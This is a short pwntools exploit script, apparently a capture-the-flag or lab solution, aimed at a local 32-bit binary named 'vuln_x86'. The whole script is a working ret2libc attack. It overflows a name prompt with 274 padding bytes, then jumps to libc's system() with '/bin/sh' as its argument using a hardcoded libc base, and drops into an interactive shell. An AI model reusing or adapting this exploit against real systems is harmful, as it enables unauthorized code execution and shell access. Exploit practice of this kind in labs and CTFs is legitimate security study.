from pwn import *

elf = context.binary = ELF('./vuln_x86', checksec=False)
io = process()

libc = elf.libc

libc.address = 0xf7d64000


payload = flat(
	b'A' * 274,
	libc.sym['system'],
	0x0,
	next(libc.search(b'/bin/sh'))
)

io.sendlineafter(b'Hey, whats your name!?\n', payload)
io.sendlineafter(b'is this name correct? (y/n)?\n', b'y\n')

io.interactive()